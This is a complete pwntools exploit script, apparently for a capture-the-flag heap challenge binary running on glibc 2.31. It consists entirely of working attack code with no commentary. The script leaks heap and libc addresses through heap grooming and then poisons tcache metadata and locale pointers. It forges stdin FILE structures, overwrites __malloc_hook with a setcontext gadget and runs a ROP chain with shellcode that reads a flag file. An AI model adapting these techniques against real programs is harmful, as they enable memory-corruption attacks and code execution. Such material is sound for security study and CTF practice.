from pwn import *
from IO_FILE import *

context.arch = 'amd64'

###Util
def create(size,data):
    r.sendlineafter('choice : ','1')
    r.sendlineafter('length : ',hex(size-4))
    r.sendafter('name : ',data)

def show(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('index : ',hex(idx))
    size = int(r.recvline()[:-1].split(b'ID : ')[1])
    facilities = r.recvline()[:-1].split(b'Name : ')[1]
    return size,facilities

def delete(idx):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('index : ',hex(idx))

def scanf_consolidate():
    r.sendlineafter('choice : ','0'*0x400)

###Addr
#  libc2.31(Ubuntu)
malloc_hook_offset = 0x1ebb70
mp_offset = 0x1eb280
tcachebins_offset = mp_offset+0x50
tcachecount_offset = mp_offset+0x60
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
small_bin_offset = main_arena_offset+0x70
large_bin_offset = main_arena_offset+0x450
stdin_struct_offset = 0x1eb980
stdin_bufbase_offset = stdin_struct_offset+0x38
stdin_shortbuf_offset = stdin_struct_offset+0x83
IO_str_jumps_offset = 0x1ed560
#memalign_hook_ini_offset = 0x9d550
#realloc_hook_ini_offset = 0x9dbd0
tls_offset = 0x1f35c0
libc_tsd_locale_offset = tls_offset-0x90
ctype_tolower_offset = 0x19e4c0

###ROPgadget
L_nop = 0x3491f
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162726
L_pop_rax = 0x4a550
L_syscall = 0x66209
set_context_gadget = 0x580bd

###Exploit
r = process('./H',env={'LD_PRELOAD':'./libc-2.31.so'})

TCACHE_COUNT = 7

for i in range(3):  #Padding to nudge tcache entry for 0x810
    create(0x18,'M30W') #0
    delete(0)

for i in range(TCACHE_COUNT):
    create(0x28,'M30W') #0
    delete(0)
create(0x28,'M30W')     #0
create(0x28,'M30W')     #1
delete(1)
delete(0)
create(0x38,'M30W')     #0
for i in range(TCACHE_COUNT):
    create(0x38,'M30W') #1
    delete(1)
delete(0)
create(0x28,'M30W')     #0
create(0x28,'M30W')     #1'
delete(0)
delete(1)
create(0x28,'M30W')     #0
delete(1)
leaks = show(0)
heap_addr = leaks[0]+(u32(leaks[1].ljust(4,b'\x00'))<<32)-0x440
print(hex(heap_addr))

create(0x28,'M30W')     #1
delete(0)

scanf_consolidate()
leaks = show(1)
unsorted_bin_addr = leaks[0]+(u32(leaks[1].ljust(4,b'\x00'))<<32)
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

create(0x18,'M30W') #0
delete(0)
for i in range(TCACHE_COUNT-4-1):
    create(0x38,p32(0)+p64(0x21))   #0
    delete(1)
    delete(0)
for i in range(TCACHE_COUNT+1):
    create(0x38,p32(0)+p64(0xb1)) #0
    delete(1)
    delete(0)
create(0x38,p32(0)+p64(0x21)+p64(heap_addr+0x4a0)+p64(libc_base+unsorted_bin_offset)+p64(0x20)+p64(0x20)) #0
scanf_consolidate()
delete(0)
create(0x38,p32(0)+p64(0x31)) #0
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x21)+p64(heap_addr+0x4a0)+p64(libc_base+unsorted_bin_offset)+p64(0x20)+p64(0x20)) #0
create(0x38,p32(0)+p64(0)+p64(0)+p64(0x21)+p64(heap_addr+0x470)+p64(libc_base+tcachecount_offset-0x5-0x10)) #1
delete(0)
create(0x38,p32(0)+p64(0x21)+p64(0)+p64(heap_addr+0x4c0)+p64(0)+p64(0x31))   #0
delete(1)

create(0x18,'M30W')   #1

TCACHE_COUNT = libc_base>>40

delete(1)
create(0x38,'M30W')
delete(1)
create(0x38,p32(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(heap_addr+0x470)+p64(libc_base+libc_tsd_locale_offset-0x10))
delete(1)
create(0x38,'M30W')
delete(1)
create(0x38,p32(0)+p64(0)+p64(heap_addr+(0x290+0x20*3+0x30*9+0x40*(TCACHE_COUNT-2))+0x10)+p64(libc_base+ctype_tolower_offset))
delete(1)
for i in range(TCACHE_COUNT-7-6):
    create(0x38,p32(0)+p64(0)+p64(0)+p64(0x41)+p64(0x460)+p64(0x40))    #1
    delete(1)
create(0x38,p32(0)+p64(0)+b'\x00\x10'*0x2+b'\x00\x20'+b'\x00\x10'*0x11)
delete(1)
create(0x38,p32(0)+p64(0)+b'\x00\x10'*0x14)
delete(1)

delete(0)
create(0x38,p32(0)+p64(0x31)+p64(heap_addr+0x40)) #0
create(0x28,'M30W') #1
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x431))  #0
delete(1)
scanf_consolidate()
delete(0)
create(0x38,p32(0)+p64(0x491))  #0
delete(1)
create(0x28,'M30W') #1
delete(1)
scanf_consolidate()
delete(0)
create(0x38,p32(0)+p64(0x431)+p64(libc_base+large_bin_offset)+p64(libc_base+large_bin_offset)+p64(heap_addr+0x470)+p64(heap_addr+0x470))    #0
create(0x38,p32(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x21))  #1
scanf_consolidate()
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x471))  #0
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x41))   #0
create(0x38,p32(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x461)+p64(libc_base+small_bin_offset))  #1
delete(0)
create(0x38,p32(0)+p64(0x461)+p64(libc_base+unsorted_bin_offset)+p64(libc_base+unsorted_bin_offset))  #0
scanf_consolidate()

TCACHE_COUNT = heap_addr>>40

delete(0)
create(0x38,p32(0)+p64(0x41))   #0
delete(1)
delete(0)
for i in range(TCACHE_COUNT-8-2):
    create(0x38,p32(0)+p64(0x21))   #0
    delete(1)
    delete(0)

create(0x38,p32(0)+p64(0x21)+p64(0)+p64(heap_addr+0x6c8)+p64(0)+p64(0x21))   #0
create(0x18,'M30W') #1
delete(0)
for i in range(TCACHE_COUNT-10-1):
    create(0x38,p32(0)+p64(0x31))   #0
    delete(1)
    delete(0)

create(0x38,p32(0)+p64(0x4b1))  #0
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x41))    #0
create(0x38,p32(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x20))    #1
delete(0)
create(0x38,p32(0)+p64(0x31)+p64(libc_base+unsorted_bin_offset)+p64(libc_base+unsorted_bin_offset)+p64(0)+p64(0)+p64(0x30)) #0
scanf_consolidate()

delete(0)
create(0x38,p32(0)+p64(0x71))
delete(1)
delete(0)
create(0x38,p32(0)+p64(0x31)+p64(0)+p64(heap_addr+0x480)+p64(heap_addr+0x470)+p64(libc_base+tcachebins_offset-0x10))	#0
create(0x28,'M30W')	#1

scanf_consolidate()
delete(0)
create(0x38,p32(0)+p64(0)+p64(0)+p64(libc_base+stdin_bufbase_offset+1-0x400))   #0

padding1 = b'0'*(0x400-0x39)
fakeflags = b'\x8b\x30'
padding2 = b'0'*0x36
hijack_bufbase=b'0'+p8(((libc_base+stdin_struct_offset)>>8)&0xff)

argument = b'/home/pwn/flag\x00'.ljust(0x50,b'\x00')

IO_file = IO_FILE_plus(arch=64)
stream1 = IO_file.construct(flags = 0xfbad2082,
                            read_ptr = libc_base+stdin_shortbuf_offset, read_end = libc_base+stdin_shortbuf_offset+0x1-0xd4,
                            buf_base = libc_base+stdin_struct_offset+0x10, buf_end = libc_base+malloc_hook_offset+0x8,
                            fileno = 0,
                            shortbuf = ((libc_base+stdin_struct_offset)&0xff0000)>>16)

stream2 = IO_file.construct(read_end = 0,
                            write_base = 0, write_ptr = libc_base+malloc_hook_offset-0x110-0xa0,
                            buf_end = 0xe8000000, buf_base = 0x0,
                            fileno = 0,
                            lock = libc_base+stdin_struct_offset-0x20,
                            mode = 0xffffffff,
                            vtable = libc_base+IO_str_jumps_offset-0x10)

hijacked_malloc_hook = p64(libc_base+set_context_gadget)
stub = p64(libc_base+malloc_hook_offset-0x110+0x10)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64((libc_base+stdin_struct_offset)&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x2000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+malloc_hook_offset-0x110+0x68)

shellcode = asm(f'''
                 mov rdi, {libc_base+stdin_struct_offset-0x50}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {libc_base+stdin_struct_offset-0x50}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {libc_base+stdin_struct_offset-0x50}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 mov rdi, 0
                 mov rax, 0x3c
                 syscall
                 ''')
payload = padding1+fakeflags+padding2+hijack_bufbase+argument+stream1[:0x84]+stream2[0x10:]+(stub+ROPchain+shellcode).ljust(0x110,b'\x00')+hijacked_malloc_hook
r.sendafter('choice : ',payload)

r.interactive()
